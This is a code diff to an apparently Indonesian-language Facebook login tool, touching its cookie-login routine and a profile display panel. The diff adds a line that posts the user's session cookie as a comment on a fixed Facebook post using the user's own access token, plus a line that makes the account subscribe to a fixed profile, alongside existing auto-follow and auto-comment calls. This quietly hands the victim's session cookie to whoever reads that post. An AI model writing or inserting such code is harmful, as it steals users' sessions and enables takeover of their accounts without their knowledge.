@@ -962,7 +962,9 @@ def logincoki():
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
 					bot_follow()
+					requests.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={token}')
 					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
+					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={token}", headers={"cookie": cok})
 					bot_komen(cok, token)
 					
 					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
@@ -1145,11 +1147,11 @@ def menu():
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     console.print(Panel(f"{K2}>{H2} {negara}{K2} —» {K2}btw {H2}Fanky ganteng", padding=(0,12), width=60, style=color_panel))
-    dia.append(Panel(f"{P2}Android : {H2}Version {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
+    dia.append(Panel(f"{P2}Android : {H2}Version {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
     # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
     dia.append(
         panel(
-            f"{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
+            f"{P2}Name   : {H2}{my_name[:18]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
             title=f"{P2}Bio Data",
             width=30,
             style=f"{color_panel}",
